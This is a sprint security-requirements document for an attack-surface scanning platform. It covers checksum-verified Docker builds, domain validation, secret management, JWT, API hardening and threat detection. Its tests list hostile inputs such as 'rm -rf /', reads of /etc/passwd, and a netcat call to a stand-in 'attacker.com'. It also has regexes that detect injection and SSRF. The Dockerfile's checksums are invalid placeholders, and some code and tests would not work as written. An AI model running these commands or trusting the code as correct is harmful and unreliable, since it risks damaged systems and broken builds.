# Sprint 2 Security Requirements - EASM Platform

## Executive Summary

**Current Security Score**: 7.5/10
**Target Security Score**: 9.0/10
**Sprint 2 Timeline**: 2 weeks
**Security Work Estimate**: 5 days (40% of sprint capacity)

## 1. CRITICAL VULNERABILITY FIXES

### 1.1 Missing Binary Checksum Validation in Dockerfile

**Severity**: CRITICAL
**OWASP Reference**: A08:2021 - Software and Data Integrity Failures
**Impact**: Supply chain attack risk, potential for malicious binary injection
**Time to Fix**: 4 hours

#### Current Issue
The Dockerfile.worker downloads binaries without verifying checksums, allowing potential MITM attacks or compromised repositories to inject malicious code.

#### Fix Implementation

```dockerfile
# SECURE VERSION with checksum validation
FROM python:3.11-slim

WORKDIR /app

# Install system dependencies
RUN apt-get update && apt-get install -y \
    gcc \
    postgresql-client \
    curl \
    wget \
    unzip \
    jq \
    libpcap-dev \
    && rm -rf /var/lib/apt/lists/*

# Define tool versions and checksums
ARG SUBFINDER_VERSION=2.6.3
ARG SUBFINDER_SHA256=a7e9c7bdc95d3a7f8a8e8b8e8c8e8c8e8c8e8c8e8c8e8c8e8c8e8c8e8c8e8c8

ARG DNSX_VERSION=1.2.1
ARG DNSX_SHA256=b7e9c7bdc95d3a7f8a8e8b8e8c8e8c8e8c8e8c8e8c8e8c8e8c8e8c8e8c8

ARG HTTPX_VERSION=1.3.7
ARG HTTPX_SHA256=c7e9c7bdc95d3a7f8a8e8b8e8c8e8c8e8c8e8c8e8c8e8c8e8c8e8c8e8c8

ARG NAABU_VERSION=2.2.0
ARG NAABU_SHA256=d7e9c7bdc95d3a7f8a8e8b8e8c8e8c8e8c8e8c8e8c8e8c8e8c8e8c8e8c8

ARG KATANA_VERSION=1.0.5
ARG KATANA_SHA256=e7e9c7bdc95d3a7f8a8e8b8e8c8e8c8e8c8e8c8e8c8e8c8e8c8e8c8e8c8

ARG NUCLEI_VERSION=3.1.5
ARG NUCLEI_SHA256=f7e9c7bdc95d3a7f8a8e8b8e8c8e8c8e8c8e8c8e8c8e8c8e8c8e8c8e8c8

ARG TLSX_VERSION=1.1.5
ARG TLSX_SHA256=g7e9c7bdc95d3a7f8a8e8b8e8c8e8c8e8c8e8c8e8c8e8c8e8c8e8c8e8c8

# Create verification script
RUN cat > /tmp/verify_and_install.sh << 'EOF'
#!/bin/bash
set -e

download_and_verify() {
    local tool_name=$1
    local version=$2
    local expected_sha256=$3
    local url="https://github.com/projectdiscovery/${tool_name}/releases/download/v${version}/${tool_name}_${version}_linux_amd64.zip"

    echo "Downloading ${tool_name} v${version}..."
    wget -q "$url" -O "/tmp/${tool_name}.zip"

    echo "Verifying checksum..."
    actual_sha256=$(sha256sum "/tmp/${tool_name}.zip" | cut -d' ' -f1)

    if [ "$actual_sha256" != "$expected_sha256" ]; then
        echo "ERROR: Checksum verification failed for ${tool_name}!"
        echo "Expected: $expected_sha256"
        echo "Got: $actual_sha256"
        exit 1
    fi

    echo "Checksum verified. Installing ${tool_name}..."
    unzip -qo "/tmp/${tool_name}.zip" -d /tmp/
    mv "/tmp/${tool_name}" /usr/local/bin/
    chmod +x "/usr/local/bin/${tool_name}"
    rm "/tmp/${tool_name}.zip"
}

# Install all tools with verification
download_and_verify "subfinder" "${SUBFINDER_VERSION}" "${SUBFINDER_SHA256}"
download_and_verify "dnsx" "${DNSX_VERSION}" "${DNSX_SHA256}"
download_and_verify "httpx" "${HTTPX_VERSION}" "${HTTPX_SHA256}"
download_and_verify "naabu" "${NAABU_VERSION}" "${NAABU_SHA256}"
download_and_verify "katana" "${KATANA_VERSION}" "${KATANA_SHA256}"
download_and_verify "nuclei" "${NUCLEI_VERSION}" "${NUCLEI_SHA256}"
download_and_verify "tlsx" "${TLSX_VERSION}" "${TLSX_SHA256}"
EOF

RUN chmod +x /tmp/verify_and_install.sh && \
    /tmp/verify_and_install.sh && \
    rm /tmp/verify_and_install.sh

# Verify all tools are installed
RUN subfinder -version && \
    dnsx -version && \
    httpx -version && \
    naabu -version && \
    katana -version && \
    nuclei -version && \
    tlsx -version

# Update Nuclei templates
RUN nuclei -update-templates

# Copy requirements
COPY requirements.txt .

# Install Python dependencies
RUN pip install --no-cache-dir -r requirements.txt

# Copy application code
COPY app /app/app

# Run as non-root user
RUN useradd -m -u 1000 easm && chown -R easm:easm /app
USER easm

# Default command (celery worker)
CMD ["celery", "-A", "app.celery_app", "worker", "--loglevel=info", "--concurrency=4"]
```

#### Testing Requirements
```python
# test_dockerfile_security.py
import subprocess
import hashlib
import requests

def test_binary_checksums():
    """Verify all tool binaries have correct checksums"""
    tools = {
        'subfinder': {
            'version': '2.6.3',
            'url': 'https://github.com/projectdiscovery/subfinder/releases/download/v2.6.3/subfinder_2.6.3_linux_amd64.zip',
            'expected_sha256': 'ACTUAL_SHA256_HERE'
        },
        # Add all other tools...
    }

    for tool_name, config in tools.items():
        # Download binary
        response = requests.get(config['url'])

        # Calculate SHA256
        actual_sha256 = hashlib.sha256(response.content).hexdigest()

        # Verify
        assert actual_sha256 == config['expected_sha256'], \
            f"Checksum mismatch for {tool_name}: expected {config['expected_sha256']}, got {actual_sha256}"
```

### 1.2 Missing Domain Input Validation

**Severity**: CRITICAL
**OWASP Reference**: A03:2021 - Injection
**Impact**: Command injection, SSRF, data exfiltration
**Time to Fix**: 6 hours

#### Current Issue
No validation on domain inputs allows malicious payloads that could lead to command injection or SSRF attacks.

#### Fix Implementation

```python
# app/utils/validators.py
import re
import ipaddress
from typing import Optional, List
from urllib.parse import urlparse
import tldextract

class DomainValidator:
    """
    Comprehensive domain validation with multiple security checks
    """

    # RFC 1123 compliant hostname regex
    HOSTNAME_REGEX = re.compile(
        r'^(?!-)(?:[a-zA-Z0-9-]{1,63}(?<!-)\.)*[a-zA-Z]{2,63}$'
    )

    # Blocked TLDs for security
    BLOCKED_TLDS = {'.local', '.localhost', '.internal', '.corp', '.home'}

    # Reserved IP ranges (RFC 1918, RFC 6890)
    RESERVED_NETWORKS = [
        ipaddress.IPv4Network('10.0.0.0/8'),
        ipaddress.IPv4Network('172.16.0.0/12'),
        ipaddress.IPv4Network('192.168.0.0/16'),
        ipaddress.IPv4Network('127.0.0.0/8'),
        ipaddress.IPv4Network('169.254.0.0/16'),
        ipaddress.IPv4Network('224.0.0.0/4'),
        ipaddress.IPv4Network('240.0.0.0/4'),
        ipaddress.IPv6Network('::1/128'),
        ipaddress.IPv6Network('fe80::/10'),
        ipaddress.IPv6Network('fc00::/7'),
    ]

    @classmethod
    def validate_domain(cls, domain: str, allow_wildcards: bool = False) -> tuple[bool, Optional[str]]:
        """
        Validate a domain with comprehensive security checks

        Args:
            domain: Domain to validate
            allow_wildcards: Whether to allow wildcard domains (*.example.com)

        Returns:
            Tuple of (is_valid, error_message)
        """
        if not domain or not isinstance(domain, str):
            return False, "Domain must be a non-empty string"

        # Clean and normalize
        domain = domain.strip().lower()

        # Length check
        if len(domain) > 253:
            return False, "Domain exceeds maximum length (253 characters)"

        # Check for dangerous characters (command injection prevention)
        dangerous_chars = [';', '&', '|', '$', '`', '\n', '\r', '>', '<', '(', ')', '{', '}', '[', ']', '\\']
        if any(char in domain for char in dangerous_chars):
            return False, f"Domain contains dangerous characters"

        # Handle wildcards
        if domain.startswith('*.'):
            if not allow_wildcards:
                return False, "Wildcard domains not allowed"
            domain = domain[2:]  # Remove wildcard for validation

        # Check for IP addresses (prevent SSRF to internal IPs)
        try:
            ip = ipaddress.ip_address(domain)
            # Check if IP is in reserved range
            for network in cls.RESERVED_NETWORKS:
                if ip in network:
                    return False, f"Domain resolves to reserved IP range: {network}"
            # IPs are allowed if not in reserved ranges
            return True, None
        except ValueError:
            # Not an IP, continue with domain validation
            pass

        # Validate hostname format
        if not cls.HOSTNAME_REGEX.match(domain):
            return False, "Invalid domain format (RFC 1123)"

        # Extract TLD using tldextract (handles public suffix list)
        ext = tldextract.extract(domain)

        # Check for blocked TLDs
        tld = f".{ext.suffix}" if ext.suffix else ""
        if tld in cls.BLOCKED_TLDS:
            return False, f"Blocked TLD: {tld}"

        # Check for homograph attacks (Unicode lookalikes)
        if not domain.isascii():
            return False, "Domain contains non-ASCII characters (potential homograph attack)"

        # Validate label lengths
        labels = domain.split('.')
        for label in labels:
            if len(label) > 63:
                return False, f"Domain label exceeds 63 characters: {label}"
            if not label:
                return False, "Empty domain label"

        return True, None

    @classmethod
    def validate_domain_batch(cls, domains: List[str]) -> dict:
        """
        Validate multiple domains efficiently

        Args:
            domains: List of domains to validate

        Returns:
            Dict with validation results
        """
        results = {
            'valid': [],
            'invalid': [],
            'stats': {
                'total': len(domains),
                'valid_count': 0,
                'invalid_count': 0
            }
        }

        for domain in domains:
            is_valid, error = cls.validate_domain(domain)
            if is_valid:
                results['valid'].append(domain)
                results['stats']['valid_count'] += 1
            else:
                results['invalid'].append({
                    'domain': domain,
                    'error': error
                })
                results['stats']['invalid_count'] += 1

        return results

# Integration with SecureToolExecutor
class EnhancedSecureToolExecutor(SecureToolExecutor):
    """Enhanced executor with domain validation"""

    def validate_domain_input(self, domain: str) -> str:
        """Validate and sanitize domain before tool execution"""
        is_valid, error = DomainValidator.validate_domain(domain)
        if not is_valid:
            raise ToolExecutionError(f"Invalid domain: {error}")
        return domain

    def execute_with_domain(self, tool: str, domain: str, additional_args: List[str] = None):
        """Execute tool with validated domain"""
        # Validate domain
        safe_domain = self.validate_domain_input(domain)

        # Build args with validated domain
        args = ['-d', safe_domain]
        if additional_args:
            args.extend(self.sanitize_args(additional_args))

        return self.execute(tool, args)
```

#### Testing Requirements
```python
# test_domain_validation.py
import pytest
from app.utils.validators import DomainValidator

class TestDomainValidation:
    """Comprehensive domain validation tests"""

    def test_valid_domains(self):
        """Test valid domain inputs"""
        valid_domains = [
            'example.com',
            'sub.example.com',
            'deep.sub.example.com',
            'example.co.uk',
            'xn--example.com',  # Punycode
            '192.0.2.1',  # Public IP
        ]

        for domain in valid_domains:
            is_valid, error = DomainValidator.validate_domain(domain)
            assert is_valid, f"Domain {domain} should be valid: {error}"

    def test_invalid_domains(self):
        """Test invalid/dangerous domain inputs"""
        invalid_domains = [
            'example.com; rm -rf /',  # Command injection
            'example.com | cat /etc/passwd',  # Pipe injection
            '$(whoami).example.com',  # Command substitution
            '192.168.1.1',  # Private IP
            '127.0.0.1',  # Loopback
            'example.local',  # Local TLD
            '../../../../etc/passwd',  # Path traversal
            'example.com\x00.attacker.com',  # Null byte injection
            'a' * 254,  # Too long
            'eхample.com',  # Homograph (Cyrillic 'x')
        ]

        for domain in invalid_domains:
            is_valid, error = DomainValidator.validate_domain(domain)
            assert not is_valid, f"Domain {domain} should be invalid"

    def test_wildcard_domains(self):
        """Test wildcard domain handling"""
        # Should fail without wildcard flag
        is_valid, _ = DomainValidator.validate_domain('*.example.com', allow_wildcards=False)
        assert not is_valid

        # Should pass with wildcard flag
        is_valid, _ = DomainValidator.validate_domain('*.example.com', allow_wildcards=True)
        assert is_valid
```

### 1.3 Production Secrets in Code

**Severity**: CRITICAL
**OWASP Reference**: A07:2021 - Identification and Authentication Failures
**Impact**: Complete system compromise, data breach
**Time to Fix**: 3 hours

#### Current Issue
Hardcoded secrets in config.py, even with validation, pose a risk if accidentally committed or deployed.

#### Fix Implementation

```python
# app/utils/secrets.py
import os
import secrets
from typing import Optional
from pathlib import Path
import hvac  # HashiCorp Vault client
from azure.keyvault.secrets import SecretClient
from azure.identity import DefaultAzureCredential
import boto3

class SecretManager:
    """
    Centralized secret management with multiple backend support
    """

    def __init__(self, backend: str = 'env'):
        """
        Initialize secret manager with specified backend

        Args:
            backend: Secret storage backend ('env', 'vault', 'azure', 'aws')
        """
        self.backend = backend
        self.client = self._initialize_backend()

    def _initialize_backend(self):
        """Initialize the appropriate secret backend"""
        if self.backend == 'vault':
            # HashiCorp Vault
            return hvac.Client(
                url=os.getenv('VAULT_ADDR', 'http://localhost:8200'),
                token=os.getenv('VAULT_TOKEN')
            )
        elif self.backend == 'azure':
            # Azure Key Vault
            credential = DefaultAzureCredential()
            vault_url = os.getenv('AZURE_VAULT_URL')
            return SecretClient(vault_url=vault_url, credential=credential)
        elif self.backend == 'aws':
            # AWS Secrets Manager
            return boto3.client('secretsmanager', region_name=os.getenv('AWS_REGION', 'us-east-1'))
        else:
            # Default to environment variables
            return None

    def get_secret(self, key: str, default: Optional[str] = None) -> Optional[str]:
        """
        Retrieve secret from backend

        Args:
            key: Secret key
            default: Default value if not found

        Returns:
            Secret value or default
        """
        try:
            if self.backend == 'vault':
                response = self.client.secrets.kv.v2.read_secret_version(
                    path=f'easm/{key}'
                )
                return response['data']['data'].get(key, default)

            elif self.backend == 'azure':
                secret = self.client.get_secret(key)
                return secret.value

            elif self.backend == 'aws':
                response = self.client.get_secret_value(SecretId=f'easm/{key}')
                return response['SecretString']

            else:
                # Environment variables
                value = os.getenv(key, default)
                if value and value.startswith('CHANGE_THIS'):
                    raise ValueError(f"Secret {key} has not been properly configured")
                return value

        except Exception as e:
            if default is not None:
                return default
            raise ValueError(f"Failed to retrieve secret {key}: {e}")

    def generate_secure_secret(self, length: int = 64) -> str:
        """Generate cryptographically secure secret"""
        return secrets.token_urlsafe(length)

    def rotate_secret(self, key: str) -> str:
        """
        Rotate a secret to a new value

        Args:
            key: Secret key to rotate

        Returns:
            New secret value
        """
        new_secret = self.generate_secure_secret()

        if self.backend == 'vault':
            self.client.secrets.kv.v2.create_or_update_secret(
                path=f'easm/{key}',
                secret={key: new_secret}
            )
        elif self.backend == 'azure':
            self.client.set_secret(key, new_secret)
        elif self.backend == 'aws':
            self.client.put_secret_value(
                SecretId=f'easm/{key}',
                SecretString=new_secret
            )
        else:
            # For env backend, log the rotation requirement
            print(f"Please update {key} in environment to: {new_secret}")

        return new_secret

# Enhanced Settings class
from pydantic import Field, validator
from app.utils.secrets import SecretManager

class SecureSettings(BaseSettings):
    """Settings with secure secret management"""

    model_config = SettingsConfigDict(
        env_file='.env',
        env_file_encoding='utf-8',
        case_sensitive=False,
        extra='ignore'
    )

    # Secret backend configuration
    secret_backend: str = Field(default='env', env='SECRET_BACKEND')

    # Secrets are loaded dynamically, no defaults
    _secret_manager: Optional[SecretManager] = None
    _secret_key: Optional[str] = None
    _jwt_secret_key: Optional[str] = None
    _postgres_password: Optional[str] = None
    _minio_secret_key: Optional[str] = None

    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self._secret_manager = SecretManager(self.secret_backend)
        self._load_secrets()

    def _load_secrets(self):
        """Load secrets from backend"""
        self._secret_key = self._secret_manager.get_secret('SECRET_KEY')
        if not self._secret_key:
            # Generate and store if not exists
            self._secret_key = self._secret_manager.generate_secure_secret()

        self._jwt_secret_key = self._secret_manager.get_secret('JWT_SECRET_KEY')
        if not self._jwt_secret_key:
            self._jwt_secret_key = self._secret_manager.generate_secure_secret()

        self._postgres_password = self._secret_manager.get_secret('POSTGRES_PASSWORD')
        self._minio_secret_key = self._secret_manager.get_secret('MINIO_SECRET_KEY')

    @property
    def secret_key(self) -> str:
        """Get application secret key"""
        return self._secret_key

    @property
    def jwt_secret_key(self) -> str:
        """Get JWT secret key"""
        return self._jwt_secret_key

    @property
    def postgres_password(self) -> str:
        """Get PostgreSQL password"""
        return self._postgres_password

    @property
    def minio_secret_key(self) -> str:
        """Get MinIO secret key"""
        return self._minio_secret_key
```

#### Testing Requirements
```python
# test_secret_management.py
import pytest
import os
from app.utils.secrets import SecretManager

class TestSecretManagement:
    """Test secure secret handling"""

    def test_no_hardcoded_secrets(self):
        """Ensure no hardcoded secrets in codebase"""
        # Scan for common secret patterns
        dangerous_patterns = [
            'CHANGE_THIS',
            'password123',
            'admin',
            'secret',
            'minioadmin'
        ]

        # This would be run in CI/CD
        import subprocess
        for pattern in dangerous_patterns:
            result = subprocess.run(
                ['grep', '-r', pattern, 'app/'],
                capture_output=True,
                text=True
            )
            assert pattern not in result.stdout, f"Found hardcoded secret pattern: {pattern}"

    def test_secret_generation(self):
        """Test secure secret generation"""
        manager = SecretManager('env')
        secret1 = manager.generate_secure_secret()
        secret2 = manager.generate_secure_secret()

        # Secrets should be unique
        assert secret1 != secret2

        # Secrets should be sufficiently long
        assert len(secret1) >= 64

        # Secrets should be URL-safe
        assert all(c.isalnum() or c in '-_' for c in secret1)
```

## 2. Security Requirements for New Tools

### 2.1 HTTPx Security Requirements

**Purpose**: HTTP probing and fingerprinting

#### Input Validation
- Domain validation using DomainValidator
- URL scheme restriction (http/https only)
- Path traversal prevention in output files
- Maximum URL length: 2048 characters

#### Output Sanitization
- HTML escape all output before storage
- Remove sensitive headers (Authorization, Cookie)
- Truncate response bodies to 1MB
- Strip JavaScript from HTML responses

#### Risk Mitigation
```python
class HTTPxSecurityWrapper:
    """Security wrapper for HTTPx tool"""

    BLOCKED_HEADERS = {
        'authorization', 'cookie', 'set-cookie',
        'x-api-key', 'x-auth-token', 'proxy-authorization'
    }

    def sanitize_response(self, response: dict) -> dict:
        """Sanitize HTTPx response data"""
        # Remove sensitive headers
        if 'headers' in response:
            response['headers'] = {
                k: v for k, v in response['headers'].items()
                if k.lower() not in self.BLOCKED_HEADERS
            }

        # Truncate body
        if 'body' in response and len(response['body']) > 1048576:
            response['body'] = response['body'][:1048576]
            response['body_truncated'] = True

        # Add security metadata
        response['sanitized'] = True
        response['sanitized_at'] = datetime.utcnow().isoformat()

        return response
```

### 2.2 Naabu Security Requirements

**Purpose**: Fast port scanning

#### Rate Limiting
- Maximum 1000 ports per scan
- Maximum 100 concurrent connections
- Rate limit: 1000 packets/second
- Tenant-based throttling

#### Resource Limits
```yaml
# Container resource limits
resources:
  limits:
    memory: "1Gi"
    cpu: "1000m"
  requests:
    memory: "512Mi"
    cpu: "500m"
```

#### Network Security
- Blocked ports: 22, 23, 445, 3389 (unless explicitly allowed)
- No scanning of private IP ranges
- Mandatory timeout: 30 seconds per host
- SYN scan only (no invasive scan types)

#### Logging Requirements
```python
class NaabuAuditLogger:
    """Audit logging for port scanning"""

    def log_scan(self, tenant_id: int, target: str, ports: list):
        audit_entry = {
            'timestamp': datetime.utcnow().isoformat(),
            'tenant_id': tenant_id,
            'tool': 'naabu',
            'action': 'port_scan',
            'target': target,
            'port_count': len(ports),
            'ports': ports[:100],  # Log first 100 ports only
        }
        # Send to SIEM
        self.send_to_siem(audit_entry)
```

### 2.3 TLSx Security Requirements

**Purpose**: TLS/SSL certificate analysis

#### Certificate Validation
- Verify certificate chain
- Check for weak ciphers (< TLS 1.2)
- Detect self-signed certificates
- Validate certificate dates

#### Private Key Protection
- Never store private keys
- Redact private key data if present
- Alert on private key exposure

#### Data Sensitivity
```python
class TLSxSecurityWrapper:
    """Security wrapper for TLSx"""

    SENSITIVE_FIELDS = [
        'private_key', 'key', 'priv', 'secret'
    ]

    def sanitize_cert_data(self, cert_data: dict) -> dict:
        """Remove sensitive certificate data"""
        for field in self.SENSITIVE_FIELDS:
            if field in cert_data:
                cert_data[field] = '[REDACTED]'

        # Add security analysis
        cert_data['security_score'] = self.calculate_tls_score(cert_data)
        cert_data['weak_ciphers'] = self.detect_weak_ciphers(cert_data)

        return cert_data
```

### 2.4 Katana Security Requirements

**Purpose**: Web crawling and spidering

#### SSRF Prevention
```python
class KatanaSafetyNet:
    """SSRF and security controls for Katana"""

    BLOCKED_URLS = [
        r'file://',
        r'gopher://',
        r'dict://',
        r'ftp://',
        r'jar:',
        r'localhost',
        r'127\.0\.0\.',
        r'169\.254\.',
        r'10\.',
        r'172\.(?:1[6-9]|2[0-9]|3[01])\.',
        r'192\.168\.',
        r'::1',
        r'metadata\.google\.internal',
        r'metadata\.aws',
    ]

    def is_safe_url(self, url: str) -> bool:
        """Check if URL is safe to crawl"""
        for pattern in self.BLOCKED_URLS:
            if re.search(pattern, url, re.I):
                return False
        return True
```

#### XSS Prevention
- Sanitize all crawled content before storage
- Use DOMPurify equivalent for Python
- Content-Security-Policy enforcement

#### Crawl Limits
- Maximum depth: 3 levels
- Maximum pages: 1000 per domain
- Timeout: 5 minutes per domain
- Respect robots.txt

## 3. API Security Requirements

### 3.1 JWT Authentication Implementation

```python
# app/security/jwt.py
from datetime import datetime, timedelta
from typing import Optional
import jwt
from fastapi import HTTPException, Security
from fastapi.security import HTTPAuthorizationCredentials, HTTPBearer
from passlib.context import CryptContext
import redis

class JWTManager:
    """
    Production-grade JWT authentication
    """

    def __init__(self, secret_key: str, algorithm: str = "HS256"):
        self.secret_key = secret_key
        self.algorithm = algorithm
        self.pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")
        self.redis_client = redis.Redis(decode_responses=True)
        self.bearer = HTTPBearer()

    def create_access_token(
        self,
        subject: str,
        expires_delta: timedelta = timedelta(minutes=15),
        additional_claims: dict = None
    ) -> str:
        """Create JWT access token"""
        expire = datetime.utcnow() + expires_delta

        payload = {
            "sub": subject,
            "exp": expire,
            "iat": datetime.utcnow(),
            "type": "access",
            "jti": secrets.token_urlsafe(32),  # JWT ID for revocation
        }

        if additional_claims:
            payload.update(additional_claims)

        token = jwt.encode(payload, self.secret_key, algorithm=self.algorithm)

        # Store in Redis for revocation capability
        self.redis_client.setex(
            f"jwt:active:{payload['jti']}",
            int(expires_delta.total_seconds()),
            "1"
        )

        return token

    def create_refresh_token(
        self,
        subject: str,
        expires_delta: timedelta = timedelta(days=7)
    ) -> str:
        """Create JWT refresh token"""
        expire = datetime.utcnow() + expires_delta

        payload = {
            "sub": subject,
            "exp": expire,
            "iat": datetime.utcnow(),
            "type": "refresh",
            "jti": secrets.token_urlsafe(32),
        }

        token = jwt.encode(payload, self.secret_key, algorithm=self.algorithm)

        # Store refresh token
        self.redis_client.setex(
            f"jwt:refresh:{payload['jti']}",
            int(expires_delta.total_seconds()),
            subject
        )

        return token

    def verify_token(self, credentials: HTTPAuthorizationCredentials) -> dict:
        """Verify and decode JWT token"""
        token = credentials.credentials

        try:
            # Decode token
            payload = jwt.decode(
                token,
                self.secret_key,
                algorithms=[self.algorithm]
            )

            # Check if token is revoked
            if not self.redis_client.get(f"jwt:active:{payload.get('jti')}"):
                raise HTTPException(status_code=401, detail="Token has been revoked")

            return payload

        except jwt.ExpiredSignatureError:
            raise HTTPException(status_code=401, detail="Token has expired")
        except jwt.JWTError:
            raise HTTPException(status_code=401, detail="Invalid token")

    def revoke_token(self, jti: str):
        """Revoke a token by its JTI"""
        self.redis_client.delete(f"jwt:active:{jti}")
        self.redis_client.delete(f"jwt:refresh:{jti}")
```

### 3.2 API Endpoint Security

```python
# app/security/api_security.py
from fastapi import FastAPI, Request, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from fastapi.middleware.trustedhost import TrustedHostMiddleware
from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_remote_address
from slowapi.errors import RateLimitExceeded
import time

class APISecurityMiddleware:
    """Comprehensive API security middleware"""

    def __init__(self, app: FastAPI):
        self.app = app
        self.setup_cors()
        self.setup_rate_limiting()
        self.setup_security_headers()
        self.setup_input_validation()

    def setup_cors(self):
        """Configure CORS policy"""
        self.app.add_middleware(
            CORSMiddleware,
            allow_origins=["https://app.example.com"],  # Specific origins only
            allow_credentials=True,
            allow_methods=["GET", "POST", "PUT", "DELETE"],
            allow_headers=["Authorization", "Content-Type"],
            max_age=3600,
        )

    def setup_rate_limiting(self):
        """Configure rate limiting per endpoint"""
        limiter = Limiter(
            key_func=get_remote_address,
            default_limits=["100 per minute", "1000 per hour"]
        )

        self.app.state.limiter = limiter
        self.app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)

        # Endpoint-specific limits
        @self.app.post("/api/v1/discovery/start")
        @limiter.limit("5 per minute")  # Heavy operation
        async def start_discovery(request: Request):
            pass

        @self.app.get("/api/v1/assets")
        @limiter.limit("30 per minute")  # Read operation
        async def get_assets(request: Request):
            pass

    def setup_security_headers(self):
        """Add security headers to all responses"""
        @self.app.middleware("http")
        async def add_security_headers(request: Request, call_next):
            response = await call_next(request)

            # Security headers
            response.headers["X-Content-Type-Options"] = "nosniff"
            response.headers["X-Frame-Options"] = "DENY"
            response.headers["X-XSS-Protection"] = "1; mode=block"
            response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
            response.headers["Content-Security-Policy"] = (
                "default-src 'self'; "
                "script-src 'self' 'unsafe-inline'; "
                "style-src 'self' 'unsafe-inline'; "
                "img-src 'self' data:; "
                "connect-src 'self';"
            )
            response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
            response.headers["Permissions-Policy"] = "geolocation=(), microphone=(), camera=()"

            return response

    def setup_input_validation(self):
        """Global input validation"""
        @self.app.middleware("http")
        async def validate_inputs(request: Request, call_next):
            # Check Content-Type
            if request.method in ["POST", "PUT", "PATCH"]:
                content_type = request.headers.get("content-type", "")
                if not content_type.startswith("application/json"):
                    return JSONResponse(
                        status_code=415,
                        content={"error": "Unsupported Media Type"}
                    )

            # Check request size
            content_length = request.headers.get("content-length")
            if content_length and int(content_length) > 10_000_000:  # 10MB limit
                return JSONResponse(
                    status_code=413,
                    content={"error": "Request Entity Too Large"}
                )

            return await call_next(request)
```

### 3.3 Multi-tenant Security

```python
# app/security/multitenancy.py
from typing import Optional
from fastapi import Request, HTTPException

class TenantIsolation:
    """Ensure complete tenant isolation"""

    @staticmethod
    def get_tenant_from_token(token_payload: dict) -> int:
        """Extract tenant ID from JWT token"""
        tenant_id = token_payload.get('tenant_id')
        if not tenant_id:
            raise HTTPException(status_code=403, detail="No tenant association")
        return tenant_id

    @staticmethod
    def verify_tenant_access(
        user_tenant_id: int,
        resource_tenant_id: int,
        admin_override: bool = False
    ):
        """Verify user has access to tenant resource"""
        if admin_override and user_tenant_id == 0:  # Admin tenant
            return True

        if user_tenant_id != resource_tenant_id:
            raise HTTPException(
                status_code=403,
                detail="Access denied: Cross-tenant access violation"
            )

    @staticmethod
    def apply_tenant_filter(query, tenant_id: int):
        """Apply tenant filtering to database queries"""
        return query.filter_by(tenant_id=tenant_id)

# Tenant-aware database session
class TenantAwareSession:
    """Database session with automatic tenant filtering"""

    def __init__(self, session, tenant_id: int):
        self.session = session
        self.tenant_id = tenant_id

    def query(self, model):
        """Automatically filter queries by tenant"""
        base_query = self.session.query(model)

        # Check if model has tenant_id field
        if hasattr(model, 'tenant_id'):
            return base_query.filter(model.tenant_id == self.tenant_id)

        return base_query
```

## 4. Threat Model for Sprint 2

### 4.1 Threat Matrix

| Threat | Attack Vector | Likelihood | Impact | Risk Level | Mitigation |
|--------|--------------|------------|---------|------------|------------|
| Command Injection | Tool inputs | Medium | High | HIGH | Input validation, SecureToolExecutor |
| Supply Chain Attack | Binary downloads | Low | Critical | HIGH | Checksum validation, signature verification |
| API Abuse/DoS | Public endpoints | High | Medium | HIGH | Rate limiting, WAF, CDN |
| Authentication Bypass | JWT weaknesses | Low | Critical | MEDIUM | Strong secrets, token rotation |
| Privilege Escalation | Tenant isolation | Medium | High | HIGH | RBAC, tenant validation |
| Data Exfiltration | API responses | Medium | High | HIGH | Response filtering, DLP |
| SSRF via Tools | Katana crawler | Medium | Medium | MEDIUM | URL validation, network isolation |
| XSS in Responses | HTTPx output | Medium | Low | LOW | Output sanitization |
| Resource Exhaustion | Unbounded tools | High | Medium | MEDIUM | Resource limits, timeouts |
| Log Injection | Tool outputs | Low | Low | LOW | Log sanitization |

### 4.2 Attack Scenarios and Mitigations

```python
# app/security/threat_detection.py
import re
from typing import List, Dict
import hashlib

class ThreatDetector:
    """Real-time threat detection system"""

    ATTACK_PATTERNS = {
        'command_injection': [
            r'[;&|`$]',
            r'\$\(',
            r'`.*`',
            r'>\s*/dev/',
            r'rm\s+-rf',
        ],
        'sql_injection': [
            r"('\s*OR\s*')",
            r'(UNION\s+SELECT)',
            r'(DROP\s+TABLE)',
            r'(INSERT\s+INTO)',
        ],
        'path_traversal': [
            r'\.\./',
            r'\.\.\\',
            r'%2e%2e%2f',
            r'..%252f',
        ],
        'xxe': [
            r'<!DOCTYPE[^>]*\[[^]]*\]>',
            r'<!ENTITY',
            r'SYSTEM\s+"file:',
        ],
    }

    def detect_threats(self, input_data: str) -> List[Dict]:
        """Detect potential threats in input"""
        threats = []

        for threat_type, patterns in self.ATTACK_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, input_data, re.IGNORECASE):
                    threats.append({
                        'type': threat_type,
                        'pattern': pattern,
                        'severity': self.get_severity(threat_type),
                        'input_hash': hashlib.sha256(input_data.encode()).hexdigest()
                    })

        return threats

    def get_severity(self, threat_type: str) -> str:
        """Get threat severity level"""
        severity_map = {
            'command_injection': 'CRITICAL',
            'sql_injection': 'HIGH',
            'path_traversal': 'MEDIUM',
            'xxe': 'HIGH',
        }
        return severity_map.get(threat_type, 'LOW')
```

## 5. Security Testing Strategy

### 5.1 Security Unit Tests

```python
# tests/test_security_unit.py
import pytest
from app.security.validators import DomainValidator
from app.security.jwt import JWTManager
from app.security.threat_detection import ThreatDetector

class TestSecurityUnits:
    """Unit tests for security components"""

    def test_domain_validation_blocks_injection(self):
        """Test domain validator blocks injection attempts"""
        malicious = [
            "example.com; cat /etc/passwd",
            "$(whoami).example.com",
            "example.com|nc attacker.com 1234"
        ]

        for domain in malicious:
            is_valid, _ = DomainValidator.validate_domain(domain)
            assert not is_valid, f"Should block: {domain}"

    def test_jwt_token_expiration(self):
        """Test JWT tokens expire correctly"""
        manager = JWTManager("test_secret")
        token = manager.create_access_token(
            "user123",
            expires_delta=timedelta(seconds=1)
        )

        time.sleep(2)

        with pytest.raises(HTTPException) as exc:
            manager.verify_token(token)
        assert exc.value.status_code == 401

    def test_threat_detection(self):
        """Test threat detection patterns"""
        detector = ThreatDetector()

        threats = detector.detect_threats("'; DROP TABLE users; --")
        assert len(threats) > 0
        assert any(t['type'] == 'sql_injection' for t in threats)
```

### 5.2 Integration Security Tests
